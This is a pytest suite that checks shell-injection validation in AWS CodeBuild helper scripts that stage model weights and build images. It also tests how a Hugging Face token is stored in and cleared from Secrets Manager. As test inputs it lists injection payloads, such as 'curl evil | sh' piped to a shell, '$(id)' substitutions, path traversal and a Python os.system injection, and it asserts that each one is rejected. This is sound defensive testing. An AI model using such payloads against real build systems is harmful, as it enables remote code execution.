# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: Apache-2.0

"""Shell-injection hardening for the CodeBuild helper scripts.

scripts/stage-weights.py and scripts/build-image.py turn CLI arguments and
endpoint.yaml values into a buildspec — a shell script run on the CodeBuild host
under the build role. These tests pin that every such value is validated before
it is interpolated, that the real cartridges still pass, and that the weight
staging commands for a legitimate source are unchanged in shape. No AWS calls.
"""

import importlib.util
import json
import shlex
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
MODELS_DIR = REPO_ROOT / "inference" / "models"


def _load(name, filename):
    spec = importlib.util.spec_from_file_location(name, REPO_ROOT / "scripts" / filename)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


sw = _load("stage_weights", "stage-weights.py")
bi = _load("build_image", "build-image.py")

INJECTIONS = ["a/b; curl evil | sh", "a/b$(id)", "a/b`id`", "a/b' || true '", "a/b\nid", "../../x"]


# --------------------------------------------------------------------------
# stage-weights.py
# --------------------------------------------------------------------------


def test_stage_weights_accepts_the_documented_sources():
    for source, subdir in [
        ("hf:robbyant/lingbot-world-base-cam", ""),
        ("hf:robbyant/lingbot-world-fast", "lingbot_world_fast"),
        ("torch_hub:facebookresearch/vjepa2:vjepa2_ac_vit_giant", ""),
    ]:
        cmds = sw.build_commands(source, subdir, "s3://bucket/prefix/", "us-east-1")
        assert cmds[-1] == "echo '=== DONE ==='"


def test_stage_weights_hf_download_command_is_unchanged_for_a_plain_repo():
    cmds = sw.build_commands("hf:robbyant/lingbot-world-fast", "lingbot_world_fast",
                             "s3://bucket/prefix/", "us-east-1")
    assert "hf download robbyant/lingbot-world-fast --local-dir /tmp/weights/lingbot_world_fast" in cmds  # nosec B108


def test_stage_weights_torch_hub_moves_checkpoints_to_the_literal_staging_dir():
    """The remote python must not reference the local _REMOTE_TMP name (NameError)."""
    cmds = sw.build_commands("torch_hub:facebookresearch/vjepa2:vjepa2_ac_vit_giant", "",
                             "s3://bucket/prefix/", "us-east-1")
    py = next(c for c in cmds if c.startswith("python3 -c"))
    assert "_REMOTE_TMP" not in py
    assert f"'{sw._REMOTE_TMP}/'" in py


@pytest.mark.parametrize("repo", INJECTIONS)
def test_stage_weights_rejects_hostile_hf_repo(repo):
    with pytest.raises(SystemExit):
        sw.build_commands(f"hf:{repo}", "", "s3://bucket/prefix/", "us-east-1")


@pytest.mark.parametrize("entry", ["x'); import os; os.system('id'); ('", "a b", "a;b"])
def test_stage_weights_rejects_hostile_torch_hub_entrypoint(entry):
    with pytest.raises(SystemExit):
        sw.build_commands(f"torch_hub:facebookresearch/vjepa2:{entry}", "",
                          "s3://bucket/prefix/", "us-east-1")


@pytest.mark.parametrize("subdir", ["x; id", "../x", "/abs", "a b"])
def test_stage_weights_rejects_hostile_subdir(subdir):
    with pytest.raises(SystemExit):
        sw.build_commands("hf:robbyant/lingbot-world-fast", subdir, "s3://bucket/prefix/", "us-east-1")


def test_stage_weights_quotes_the_s3_destination():
    cmds = sw.build_commands("hf:a/b", "", "s3://bucket/we ird;id/", "us-east-1")
    sync = next(c for c in cmds if c.startswith("aws s3 sync"))
    assert shlex.quote("s3://bucket/we ird;id/") in sync


def test_stage_weights_never_sends_hf_token_as_plaintext():
    src = (REPO_ROOT / "scripts" / "stage-weights.py").read_text()
    assert '"type": "PLAINTEXT"' not in src
    assert '"type": "SECRETS_MANAGER"' in src


# --------------------------------------------------------------------------
# build-image.py
# --------------------------------------------------------------------------


def _cartridges():
    return sorted(p.name for p in MODELS_DIR.iterdir()
                  if p.is_dir() and (p / "endpoint.yaml").exists())


@pytest.mark.parametrize("model", _cartridges())
def test_build_image_accepts_every_shipped_cartridge(model):
    """Validation must not reject any real endpoint.yaml."""
    bi.checked(model, bi._MODEL_RE, "model id")
    bi.get_version(model)
    bi.get_base_image(model)
    wheel = bi.manifest_scalar(model, "flash_attn_wheel")
    if wheel:
        bi.checked(wheel, bi._WHEEL_RE, "flash_attn_wheel")
    no_deps = bi.manifest_scalar(model, "pip_no_deps")
    if no_deps is not None:
        bi.checked(no_deps, bi._FLAG_RE, "pip_no_deps")


@pytest.mark.parametrize("value, pattern", [
    ("foo; curl evil | sh", "_IMAGE_RE"),
    ("nvcr.io/x:1 $(id)", "_IMAGE_RE"),
    ("nvcr.io/nvidia/pytorch", "_IMAGE_RE"),          # no tag = implicit latest
    ("nvcr.io/nvidia/pytorch:latest", "_IMAGE_RE"),
    ("https://example.com/x.whl; id", "_WHEEL_RE"),
    ("http://example.com/x.whl", "_WHEEL_RE"),
    ("1 && id", "_FLAG_RE"),
    ("0.1.0; id", "_TAG_RE"),
    ("echo-async;id", "_MODEL_RE"),
    ("us-east-1; id", "_REGION_RE"),
])
def test_build_image_rejects_hostile_values(value, pattern):
    with pytest.raises(SystemExit):
        bi.checked(value, getattr(bi, pattern), "value")


@pytest.mark.parametrize("image", [
    "nvcr.io/nvidia/pytorch:24.01-py3",
    "python:3.12-slim",
    "public.ecr.aws/x/y@sha256:" + "a" * 64,
])
def test_build_image_accepts_pinned_base_images(image):
    assert bi.checked(image, bi._IMAGE_RE, "base_image") == image


def test_build_image_rejects_hostile_base_image_in_manifest(tmp_path, monkeypatch):
    (tmp_path / "evil").mkdir()
    (tmp_path / "evil" / "endpoint.yaml").write_text("base_image: foo; curl evil | sh\n")
    monkeypatch.setattr(bi, "MODELS_DIR", tmp_path)
    with pytest.raises(SystemExit):
        bi.get_base_image("evil")


# --------------------------------------------------------------------------
# stage-weights.py: the HF token's lifetime in Secrets Manager
# --------------------------------------------------------------------------


def _fake_aws(calls, build_status="SUCCEEDED", start_ok=True):
    """subprocess.run stand-in: records every aws call and fakes the responses."""
    import types

    def run(cmd, *a, **k):
        calls.append((cmd, k.get("input")))
        out, rc = "", 0
        if cmd[:3] == ["aws", "sts", "get-caller-identity"]:
            out = "test-account"
        elif cmd[:3] == ["aws", "ssm", "get-parameter"]:
            out = "s3-bucket-or-project"
        elif cmd[:3] == ["aws", "codebuild", "start-build"]:
            out, rc = ("build-1", 0) if start_ok else ("", 1)
        elif cmd[:3] == ["aws", "codebuild", "batch-get-builds"]:
            out = f"{build_status} COMPLETED"
        return types.SimpleNamespace(returncode=rc, stdout=out, stderr="")
    return run


def _secret_puts(calls):
    return [(c, i) for c, i in calls if c[:3] == ["aws", "secretsmanager", "put-secret-value"]]


@pytest.mark.parametrize("status, start_ok", [("SUCCEEDED", True), ("FAILED", True), (None, False)])
def test_hf_token_is_stored_then_cleared_twice_whatever_the_outcome(monkeypatch, status, start_ok):
    calls = []
    monkeypatch.setattr(sw.subprocess, "run", _fake_aws(calls, status or "SUCCEEDED", start_ok))
    monkeypatch.setattr(sw.time, "sleep", lambda s: None)
    monkeypatch.setenv("HF_TOKEN", "hf_secret_value")
    monkeypatch.setattr("sys.argv", ["stage-weights.py", "echo-async", "--source", "hf:a/b", "--region", "us-east-1"])
    try:
        sw.main()
    except SystemExit:
        pass
    puts = _secret_puts(calls)
    # First the real token, passed on stdin (never on the command line)...
    assert puts[0][1] == "hf_secret_value" and "hf_secret_value" not in " ".join(puts[0][0])
    # ...then the placeholder twice, so the token keeps no staging label.
    assert [c[c.index("--secret-string") + 1] for c, _ in puts[1:]] == [sw._CLEARED, sw._CLEARED]
    start = next(c for c, _ in calls if c[:3] == ["aws", "codebuild", "start-build"])
    overrides = json.loads(start[start.index("--environment-variables-override") + 1])
    assert overrides == [{"name": "HF_TOKEN", "value": sw.HF_TOKEN_SECRET, "type": "SECRETS_MANAGER"}]


def test_no_secret_calls_without_hf_token(monkeypatch):
    calls = []
    monkeypatch.setattr(sw.subprocess, "run", _fake_aws(calls))
    monkeypatch.setattr(sw.time, "sleep", lambda s: None)
    monkeypatch.delenv("HF_TOKEN", raising=False)
    monkeypatch.setattr("sys.argv", ["stage-weights.py", "echo-async", "--source", "hf:a/b", "--region", "us-east-1"])
    sw.main()
    assert _secret_puts(calls) == []
